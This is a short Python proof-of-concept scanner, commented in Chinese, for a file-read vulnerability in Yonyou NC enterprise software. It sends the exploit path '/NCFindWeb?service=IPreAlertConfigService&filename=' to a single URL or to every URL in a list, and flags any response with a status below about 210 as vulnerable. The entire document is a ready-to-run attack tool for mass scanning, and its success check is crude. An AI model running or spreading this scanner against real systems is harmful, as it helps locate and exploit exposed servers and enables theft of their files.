#用友nc文件读取
import sys
import requests
sess = requests.session()
payload = '/NCFindWeb?service=IPreAlertConfigService&filename='
def test_url(url):
    url_req = url + payload
    #print(url)
    try:
        req = sess.get(url_req, timeout=3)
        if req.status_code <= 210:
            print("[+]" + url + "存在文件读取！")
        else:
            print("[+]" + url + "不存在文件读取！")
    except:
        print("请求超时！")
    sess.close()

def test_urls(url):
    url = open(url,'r')
    for i in url:
        url = i.rstrip('\n') + payload
        try:
            req = requests.get(url,timeout=3)
            if req.status_code < 210:
                print("[+]" + url + "存在文件读取漏洞！")
            else:
                print("[+]" + url + "不存在文件读取漏洞！")
        except:
            print("请求超时！")

if __name__ == '__main__':
    print("#用友NC文件读取")
    print("------------------------------------------------------")
    print("使用说明： python poc.py 单个url/url文件")
    print("------------------------------------------------------")
    try:
        url = sys.argv[1]
        if "http" in url:
            test_url(url)
        else:
            test_urls(url)
    except FileNotFoundError:
        print("输入有误！")